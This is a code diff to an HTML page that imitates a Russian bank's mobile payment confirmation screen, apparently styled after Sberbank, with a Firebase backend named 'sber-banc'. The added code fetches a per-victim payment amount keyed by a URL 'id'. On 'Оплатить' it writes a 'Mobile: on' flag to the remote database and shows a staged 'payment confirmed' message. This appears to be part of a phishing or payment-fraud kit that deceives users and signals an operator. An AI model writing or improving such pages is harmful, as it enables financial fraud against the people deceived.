@@ -21,6 +21,7 @@
     overflow: hidden;
     box-shadow: 0 0 20px rgba(0,0,0,0.2);
     background: #fff;
+    text-align: center;
   }
   .header {
     background: linear-gradient(180deg, #50c878, #a8e6a1);
@@ -81,34 +82,40 @@
     color: green;
     display: none;
   }
+  .loading {
+    display: none;
+    font-size: 20px;
+    font-weight: bold;
+    margin-top: 50px;
+  }
 </style>
 </head>
 <body>
-<div class="phone">
+<div class="phone" id="paymentBox">
   <div class="header">Pay</div>
   <div class="content">
     <div class="shop">Магазин</div>
-    <div class="amount">400 ₽</div>
+    <div class="amount" id="amount">...</div>
     <div class="account">
       <span><b>Счёт списания</b></span>
       <span>Платёжный счёт ••0000</span>
       <span style="color:green;font-weight:bold;">100 000 ₽</span>
     </div>
     <div class="buttons">
-      <button class="btn-pay" onclick="confirmPayment()">Оплатить 400 ₽</button>
+      <button class="btn-pay" onclick="confirmPayment()">Оплатить</button>
       <button class="btn-cancel" onclick="exitBrowser()">Отменить</button>
     </div>
     <div class="message"></div>
   </div>
 </div>
+<div class="loading" id="loading">Загрузка...</div>
 
 <!-- Firebase SDK -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-analytics.js";
-  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+  import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
-  // 🔹 Твой Firebase-конфиг
   const firebaseConfig = {
     apiKey: "AIzaSyAqgmvAb-msCN5xsimpXDuAg4FXOBLuEDA",
     authDomain: "sber-banc.firebaseapp.com",
@@ -119,19 +126,16 @@
     appId: "1:17673551515:web:9d400bc82df02c63ed503e"
   };
 
-  // Инициализация Firebase
   const app = initializeApp(firebaseConfig);
   const analytics = getAnalytics(app);
   const database = getDatabase(app);
 
-  // Получаем ID из URL
   function getUserID() {
     const params = new URLSearchParams(window.location.search);
     return params.get('id');
   }
 
-  // Подтверждение оплаты
-  window.confirmPayment = async function() {
+  async function loadPaymentAmount() {
     const id = getUserID();
     if (!id) {
       alert("ID пользователя не найден!");
@@ -139,17 +143,53 @@
     }
 
     try {
+      const dbRef = ref(database);
+      const snapshot = await get(child(dbRef, id + '/value'));
+      if (snapshot.exists()) {
+        const rawValue = snapshot.val();
+        const match = rawValue.match(/\d+/);
+        const amount = match ? match[0] : "0";
+        document.getElementById("amount").textContent = amount + " ₽";
+      } else {
+        document.getElementById("amount").textContent = "0 ₽";
+      }
+    } catch (e) {
+      alert("Ошибка при получении суммы: " + e);
+    }
+  }
+
+  loadPaymentAmount();
+
+  window.confirmPayment = async function() {
+    const id = getUserID();
+    const amount = document.getElementById("amount").textContent.replace(/\D/g,'');
+    if (!id) {
+      alert("ID пользователя не найден!");
+      return;
+    }
+
+    // Показываем загрузку
+    document.getElementById("paymentBox").style.display = "none";
+    const loadingEl = document.getElementById("loading");
+    loadingEl.style.display = "block";
+
+    try {
       await set(ref(database, `${id}/Mobile`), "on");
-      const msg = document.querySelector(".message");
-      msg.textContent = "Оплата подтверждена!";
-      msg.style.display = "block";
-      document.querySelector(".btn-pay").disabled = true;
+      setTimeout(() => {
+        loadingEl.style.display = "none";
+        const msg = document.querySelector(".message");
+        msg.textContent = `Оплата ${amount} ₽ подтверждена!`;
+        msg.style.display = "block";
+        document.getElementById("paymentBox").style.display = "block";
+        document.querySelector(".btn-pay").disabled = true;
+      }, 2000);
     } catch (e) {
       alert("Ошибка Firebase: " + e);
+      document.getElementById("paymentBox").style.display = "block";
+      loadingEl.style.display = "none";
     }
   };
 
-  // Выход
   window.exitBrowser = function() {
     window.close();
   };
